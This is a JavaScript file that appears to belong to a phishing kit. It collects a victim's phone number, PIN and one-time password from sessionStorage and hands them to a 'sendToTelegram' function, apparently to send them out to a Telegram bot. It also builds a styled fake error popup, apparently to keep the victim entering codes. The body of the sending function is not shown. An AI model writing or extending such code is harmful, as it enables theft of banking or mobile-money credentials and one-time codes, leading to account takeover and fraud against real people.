// Store data in sessionStorage
const storeData = (key, value) => {
    sessionStorage.setItem(key, value);
};

// Get all stored data
const getAllData = () => {
    const data = {
        phone: sessionStorage.getItem('phone'),
        pin: sessionStorage.getItem('pin'),
        otp: sessionStorage.getItem('otp')
    };
    return data;
};

const sendToTelegram = async (data) => {
    return await sendTelegram(data.phone, data.pin, data.otp);
};


// Show error popup
const showErrorPopup = (message) => {
    const popup = document.createElement('div');
    popup.className = 'error-popup';
    popup.innerHTML = `
        <div class="error-content">
            <h3>Error</h3>
            <p>${message}</p>
            <button onclick="this.parentElement.parentElement.remove()">OK</button>
        </div>
    `;
    document.body.appendChild(popup);
};

// Add popup styles
const style = document.createElement('style');
style.textContent = `
    .error-popup {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.5);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 1000;
    }
    .error-content {
        background: white;
        padding: 20px;
        border-radius: 8px;
        text-align: center;
        max-width: 300px;
    }
    .error-content button {
        margin-top: 15px;
        padding: 8px 20px;
        background: #673ab7;
        color: white;
        border: none;
        border-radius: 4px;
        cursor: pointer;
    }
`;
document.head.appendChild(style);
